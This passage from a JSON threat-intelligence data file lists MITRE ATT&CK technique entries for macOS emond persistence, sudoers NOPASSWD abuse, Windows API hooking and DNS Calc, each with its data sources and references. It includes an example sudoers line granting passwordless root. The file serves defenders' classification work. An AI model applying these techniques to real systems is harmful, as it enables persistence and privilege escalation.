      "description": "Adversaries may use Event Monitor Daemon (emond) to establish persistence by scheduling malicious commands to run on predictable event triggers. Emond is a [Launch Daemon](https://attack.mitre.org/techniques/T1160) that accepts events from various services, runs them through a simple rules engine, and takes action. The emond binary at <code>/sbin/emond</code> will load any rules from the <code>/etc/emond.d/rules/</code> directory and take action once an explicitly defined event takes place. The rule files are in the plist format and define the name, event type, and action to take. Some examples of event types include system startup and user authentication. Examples of actions are to run a system command or send an email. The emond service will not launch if there is no file present in the QueueDirectories path <code>/private/var/db/emondClients</code>, specified in the [Launch Daemon](https://attack.mitre.org/techniques/T1160) configuration file at<code>/System/Library/LaunchDaemons/com.apple.emond.plist</code>.(Citation: xorrior emond Jan 2018)(Citation: magnusviri emond Apr 2016)(Citation: sentinelone macos persist Jun 2019)\n\nAdversaries may abuse this service by writing a rule to execute commands when a defined event occurs, such as system start up or user authentication.(Citation: xorrior emond Jan 2018)(Citation: magnusviri emond Apr 2016)(Citation: sentinelone macos persist Jun 2019) Adversaries may also be able to escalate privileges from administrator to root as the emond service is executed with root privileges by the [Launch Daemon](https://attack.mitre.org/techniques/T1160) service.",
      "meta": {
        "external_id": "T1519",
        "kill_chain": [
          "mitre-attack:persistence",
          "mitre-attack:privilege-escalation"
        ],
        "mitre_data_sources": [
          "File monitoring",
          "API monitoring"
        ],
        "mitre_platforms": [
          "macOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1519",
          "https://www.xorrior.com/emond-persistence/",
          "http://www.magnusviri.com/Mac/what-is-emond.html",
          "https://www.sentinelone.com/blog/how-malware-persists-on-macos/"
        ]
      },
      "uuid": "d376668f-b208-42de-b1f5-fdfe0ad4b753",
      "value": "Emond - T1519"
    },
    {
      "description": "The sudoers file, <code>/etc/sudoers</code>, describes which users can run which commands and from which terminals. This also describes which commands users can run as other users or groups. This provides the idea of least privilege such that users are running in their lowest possible permissions for most of the time and only elevate to other users or permissions as needed, typically by prompting for a password. However, the sudoers file can also specify when to not prompt users for passwords with a line like <code>user1 ALL=(ALL) NOPASSWD: ALL</code> (Citation: OSX.Dok Malware). \n\nAdversaries can take advantage of these configurations to execute commands as other users or spawn processes with higher privileges. You must have elevated privileges to edit this file though.",
      "meta": {
        "external_id": "T1169",
        "kill_chain": [
          "mitre-attack:privilege-escalation"
        ],
        "mitre_data_sources": [
          "File monitoring"
        ],
        "mitre_platforms": [
          "Linux",
          "macOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1169",
          "https://blog.malwarebytes.com/threat-analysis/2017/04/new-osx-dok-malware-intercepts-web-traffic/"
        ]
      },
      "uuid": "9e80ddfb-ce32-4961-a778-ca6a10cfae72",
      "value": "Sudo - T1169"
    },
    {
      "description": "Windows processes often leverage application programming interface (API) functions to perform tasks that require reusable system resources. Windows API functions are typically stored in dynamic-link libraries (DLLs) as exported functions. \n\nHooking involves redirecting calls to these functions and can be implemented via:\n\n* **Hooks procedures**, which intercept and execute designated code in response to events such as messages, keystrokes, and mouse inputs. (Citation: Microsoft Hook Overview) (Citation: Endgame Process Injection July 2017)\n* **Import address table (IAT) hooking**, which use modifications to a process’s IAT, where pointers to imported API functions are stored. (Citation: Endgame Process Injection July 2017) (Citation: Adlice Software IAT Hooks Oct 2014) (Citation: MWRInfoSecurity Dynamic Hooking 2015)\n* **Inline hooking**, which overwrites the first bytes in an API function to redirect code flow. (Citation: Endgame Process Injection July 2017) (Citation: HighTech Bridge Inline Hooking Sept 2011) (Citation: MWRInfoSecurity Dynamic Hooking 2015)\n\nSimilar to [Process Injection](https://attack.mitre.org/techniques/T1055), adversaries may use hooking to load and execute malicious code within the context of another process, masking the execution while also allowing access to the process's memory and possibly elevated privileges. Installing hooking mechanisms may also provide Persistence via continuous invocation when the functions are called through normal use.\n\nMalicious hooking mechanisms may also capture API calls that include parameters that reveal user authentication credentials for Credential Access. (Citation: Microsoft TrojanSpy:Win32/Ursnif.gen!I Sept 2017)\n\nHooking is commonly utilized by [Rootkit](https://attack.mitre.org/techniques/T1014)s to conceal files, processes, Registry keys, and other objects in order to hide malware and associated behaviors. (Citation: Symantec Windows Rootkits)",
      "meta": {
        "external_id": "T1179",
        "kill_chain": [
          "mitre-attack:persistence",
          "mitre-attack:privilege-escalation",
          "mitre-attack:credential-access"
        ],
        "mitre_data_sources": [
          "API monitoring",
          "Binary file metadata",
          "DLL monitoring",
          "Loaded DLLs",
          "Process monitoring",
          "Windows event logs"
        ],
        "mitre_platforms": [
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1179",
          "https://msdn.microsoft.com/library/windows/desktop/ms644959.aspx",
          "https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process",
          "https://www.adlice.com/userland-rootkits-part-1-iat-hooks/",
          "https://www.mwrinfosecurity.com/our-thinking/dynamic-hooking-techniques-user-mode/",
          "https://www.exploit-db.com/docs/17802.pdf",
          "https://www.symantec.com/avcenter/reference/windows.rootkit.overview.pdf",
          "https://volatility-labs.blogspot.com/2012/09/movp-31-detecting-malware-hooks-in.html",
          "https://github.com/prekageo/winhook",
          "https://github.com/jay/gethooks",
          "https://zairon.wordpress.com/2006/12/06/any-application-defined-hook-procedure-on-my-machine/",
          "https://eyeofrablog.wordpress.com/2017/06/27/windows-keylogger-part-2-defense-against-user-land/",
          "http://www.gmer.net/",
          "https://msdn.microsoft.com/library/windows/desktop/ms686701.aspx",
          "https://security.stackexchange.com/questions/17904/what-are-the-methods-to-find-hooked-functions-and-apis"
        ]
      },
      "uuid": "66f73398-8394-4711-85e5-34c8540b22a5",
      "value": "Hooking - T1179"
    },
    {
      "description": "DNS Calc is a technique in which the octets of an IP address are used to calculate the port  for command and control servers from an initial DNS request. (Citation: CrowdstrikeNumberedPanda) (Citation: FireEyeDarwinsAPTGroup) (Citation: Rapid7G20Espionage)",
      "meta": {
        "external_id": "T1324",
        "kill_chain": [
          "mitre-pre-attack:adversary-opsec"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1324"
        ]
      },
      "uuid": "7823039f-e2d5-4997-853c-ec983631206b",
      "value": "DNSCalc - T1324"
    }
  ],
  "version": 12
}
